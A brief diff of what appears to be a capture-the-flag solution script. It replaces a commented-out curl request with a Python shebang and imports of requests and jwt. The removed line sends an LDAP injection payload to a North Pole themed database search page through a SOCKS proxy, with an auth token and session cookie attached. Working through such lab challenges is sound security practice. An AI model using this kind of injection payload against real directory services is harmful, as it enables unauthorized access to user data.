@@ -1,4 +1,4 @@
-#curl -x socks5h://localhost:32080 'http://edb.northpolechristmastown.com/search' -H 'Host: edb.northpolechristmastown.com' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://edb.northpolechristmastown.com/home.html' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'np-auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTEyLTMwIDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.Ap9vxVUbN-mHvJUSjdIauke3AM_CFV9EDPtyKnyUCxM' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: SESSION=VnbJ4088m5e1qp1Y704i' -H 'Connection: keep-alive' --data 'name=))(department=it)(|(cn=&isElf=True&attributes=*'  | jq .
+#!/usr/bin/env python3
 import requests
 import sys
 import jwt
